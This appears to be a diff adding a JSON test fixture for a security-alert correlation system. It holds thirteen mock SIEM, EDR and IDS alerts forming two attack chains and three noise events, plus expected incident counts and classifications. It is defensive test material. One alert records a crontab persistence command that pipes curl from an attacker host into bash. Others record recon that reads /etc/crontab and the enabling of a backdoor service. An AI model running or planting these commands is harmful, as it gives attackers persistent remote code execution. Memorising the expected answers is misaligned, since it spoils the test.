@@ -1,0 +1,232 @@
+{
+  "description": "The 'real SOC' scenario: a realistic mix of 13 alerts from multiple sources where some form correlated attack chains and others are standalone noise. Chain A (5 alerts): SSH brute force → login → persistence on web server. Chain B (4 alerts): port scan → web exploit attempt → payload delivery → C2 on different host. Plus 3 standalone uncorrelated alerts from unrelated IPs. Expected: 5 incidents total — 2 correlated chains + 3 standalone events.",
+  "expected_incidents": 5,
+  "expected_severity": "critical",
+  "expected_classification": "account_compromise",
+  "correlation_notes": {
+    "chain_A": {
+      "alerts": ["mix_a01", "mix_a02", "mix_a03", "mix_a04", "mix_a05"],
+      "correlation_signals": ["same_source_ip:203.0.113.88", "same_host:web03.corp.local", "same_user:deploy", "time_within_15m", "mitre_chain:T1110→T1078→T1059→T1543"],
+      "expected_classification": "account_compromise",
+      "narrative": "SSH brute force from 203.0.113.88 → successful login as 'deploy' → environment recon → crontab persistence → service backdoor"
+    },
+    "chain_B": {
+      "alerts": ["mix_b01", "mix_b02", "mix_b03", "mix_b04"],
+      "correlation_signals": ["same_source_ip:185.141.62.200", "same_destination_ip:10.0.1.50", "time_within_5m", "mitre_chain:T1046→T1190→T1059→T1071"],
+      "expected_classification": "cve_exploitation",
+      "narrative": "Port scan targeting 10.0.1.50 → web exploit attempt (SQLi) → suspicious payload delivery → C2 callback from victim"
+    },
+    "standalone_1": {
+      "alerts": ["mix_s01", "mix_s02"],
+      "correlation_signals": ["same_source_ip:178.62.28.100", "time_within_5m"],
+      "expected_classification": "reconnaissance",
+      "narrative": "Unrelated DNS anomaly + port probe from hosting provider IP"
+    },
+    "standalone_2": {
+      "alerts": ["mix_s03"],
+      "correlation_signals": ["isolated"],
+      "expected_classification": "brute_force_attempt",
+      "narrative": "Single failed login from VPN exit node — no chain, just noise"
+    },
+    "standalone_3": {
+      "alerts": ["mix_s04"],
+      "correlation_signals": ["isolated"],
+      "expected_classification": "reconnaissance",
+      "narrative": "DNS tunneling indicator from internal host — separate investigation needed"
+    }
+  },
+  "alerts": [
+    {
+      "source_family": "siem",
+      "source_type": "splunk_mock",
+      "external_alert_id": "mix_a01",
+      "event_time": "2026-04-09T09:00:00.000Z",
+      "payload": {
+        "event_type": "failed_login",
+        "timestamp": "2026-04-09T09:00:00.000Z",
+        "src_ip": "203.0.113.88",
+        "dst_ip": "10.0.1.30",
+        "username": "deploy",
+        "host": "web03.corp.local",
+        "description": "15 failed SSH login attempts for 'deploy' from 203.0.113.88 in 90 seconds"
+      }
+    },
+    {
+      "source_family": "siem",
+      "source_type": "splunk_mock",
+      "external_alert_id": "mix_a02",
+      "event_time": "2026-04-09T09:05:00.000Z",
+      "payload": {
+        "event_type": "success_login",
+        "timestamp": "2026-04-09T09:05:00.000Z",
+        "src_ip": "203.0.113.88",
+        "dst_ip": "10.0.1.30",
+        "username": "deploy",
+        "host": "web03.corp.local",
+        "description": "Successful SSH login as 'deploy' from brute-force source IP"
+      }
+    },
+    {
+      "source_family": "edr",
+      "source_type": "crowdstrike_mock",
+      "external_alert_id": "mix_a03",
+      "event_time": "2026-04-09T09:07:00.000Z",
+      "payload": {
+        "event_type": "process_created",
+        "timestamp": "2026-04-09T09:07:00.000Z",
+        "src_ip": "10.0.1.30",
+        "user": "deploy",
+        "host": "web03.corp.local",
+        "process_name": "bash",
+        "command_line": "bash -c 'whoami; id; uname -a; cat /etc/crontab; ps aux'",
+        "description": "Post-login environment reconnaissance — attacker profiling the target system"
+      }
+    },
+    {
+      "source_family": "edr",
+      "source_type": "crowdstrike_mock",
+      "external_alert_id": "mix_a04",
+      "event_time": "2026-04-09T09:09:00.000Z",
+      "payload": {
+        "event_type": "persistence_crontab",
+        "timestamp": "2026-04-09T09:09:00.000Z",
+        "user": "deploy",
+        "host": "web03.corp.local",
+        "process_name": "crontab",
+        "command_line": "echo '*/10 * * * * curl -s http://203.0.113.88:8888/heartbeat | bash' | crontab -",
+        "description": "Persistence via crontab — reverse shell heartbeat every 10 minutes"
+      }
+    },
+    {
+      "source_family": "edr",
+      "source_type": "crowdstrike_mock",
+      "external_alert_id": "mix_a05",
+      "event_time": "2026-04-09T09:11:00.000Z",
+      "payload": {
+        "event_type": "persistence_service",
+        "timestamp": "2026-04-09T09:11:00.000Z",
+        "user": "deploy",
+        "host": "web03.corp.local",
+        "process_name": "systemctl",
+        "command_line": "systemctl enable ssh-backup.service",
+        "description": "Backdoor systemd service 'ssh-backup' enabled for persistence"
+      }
+    },
+    {
+      "source_family": "ids",
+      "source_type": "suricata_mock",
+      "external_alert_id": "mix_b01",
+      "event_time": "2026-04-09T09:30:00.000Z",
+      "payload": {
+        "event_type": "port_scan",
+        "timestamp": "2026-04-09T09:30:00.000Z",
+        "src_ip": "185.141.62.200",
+        "dst_ip": "10.0.1.50",
+        "sensor": "ids01",
+        "description": "Vertical port scan: 128 ports probed on 10.0.1.50 (app server) from 185.141.62.200"
+      }
+    },
+    {
+      "source_family": "ids",
+      "source_type": "suricata_mock",
+      "external_alert_id": "mix_b02",
+      "event_time": "2026-04-09T09:32:00.000Z",
+      "payload": {
+        "event_type": "web_exploit",
+        "timestamp": "2026-04-09T09:32:00.000Z",
+        "src_ip": "185.141.62.200",
+        "dst_ip": "10.0.1.50",
+        "dst_port": 8080,
+        "sensor": "ids01",
+        "description": "SQL injection attempt: UNION SELECT in HTTP GET parameter targeting /api/users endpoint"
+      }
+    },
+    {
+      "source_family": "ids",
+      "source_type": "suricata_mock",
+      "external_alert_id": "mix_b03",
+      "event_time": "2026-04-09T09:34:00.000Z",
+      "payload": {
+        "event_type": "suspicious_download",
+        "timestamp": "2026-04-09T09:34:00.000Z",
+        "src_ip": "185.141.62.200",
+        "dst_ip": "10.0.1.50",
+        "dst_port": 8080,
+        "sensor": "ids01",
+        "description": "POST request with encoded payload delivered to exploited endpoint — possible webshell upload"
+      }
+    },
+    {
+      "source_family": "ids",
+      "source_type": "suricata_mock",
+      "external_alert_id": "mix_b04",
+      "event_time": "2026-04-09T09:36:00.000Z",
+      "payload": {
+        "event_type": "outbound_c2",
+        "timestamp": "2026-04-09T09:36:00.000Z",
+        "src_ip": "10.0.1.50",
+        "dst_ip": "185.141.62.200",
+        "src_port": 52000,
+        "dst_port": 443,
+        "sensor": "ids01",
+        "description": "Outbound C2 callback from 10.0.1.50 to attacker 185.141.62.200:443 — webshell active"
+      }
+    },
+    {
+      "source_family": "siem",
+      "source_type": "splunk_mock",
+      "external_alert_id": "mix_s01",
+      "event_time": "2026-04-09T09:15:00.000Z",
+      "payload": {
+        "event_type": "dns_query_suspicious",
+        "timestamp": "2026-04-09T09:15:00.000Z",
+        "src_ip": "178.62.28.100",
+        "host": "proxy01.corp.local",
+        "description": "DNS queries to entropy-rich domain: a8f3b2c1d0e9.dynamic-resolver.top — possible DGA"
+      }
+    },
+    {
+      "source_family": "ids",
+      "source_type": "suricata_mock",
+      "external_alert_id": "mix_s02",
+      "event_time": "2026-04-09T09:16:00.000Z",
+      "payload": {
+        "event_type": "port_scan",
+        "timestamp": "2026-04-09T09:16:00.000Z",
+        "src_ip": "178.62.28.100",
+        "dst_ip": "10.0.1.0/24",
+        "sensor": "ids01",
+        "description": "Light port probe: 5 common ports scanned from DigitalOcean IP — opportunistic scan"
+      }
+    },
+    {
+      "source_family": "siem",
+      "source_type": "splunk_mock",
+      "external_alert_id": "mix_s03",
+      "event_time": "2026-04-09T09:22:00.000Z",
+      "payload": {
+        "event_type": "failed_login",
+        "timestamp": "2026-04-09T09:22:00.000Z",
+        "src_ip": "104.248.99.12",
+        "dst_ip": "10.0.1.20",
+        "username": "root",
+        "host": "dc01.corp.local",
+        "description": "Single failed SSH login from VPN exit node 104.248.99.12 — opportunistic attempt"
+      }
+    },
+    {
+      "source_family": "siem",
+      "source_type": "splunk_mock",
+      "external_alert_id": "mix_s04",
+      "event_time": "2026-04-09T09:40:00.000Z",
+      "payload": {
+        "event_type": "dns_tunnel",
+        "timestamp": "2026-04-09T09:40:00.000Z",
+        "src_ip": "10.0.1.60",
+        "dst_ip": "8.8.8.8",
+        "host": "dev-ws01.corp.local",
+        "description": "DNS tunneling indicator: 200+ TXT queries to iodine-tunnel.dev.internal in 5 minutes from developer workstation"
+      }
+    }
+  ]
+}
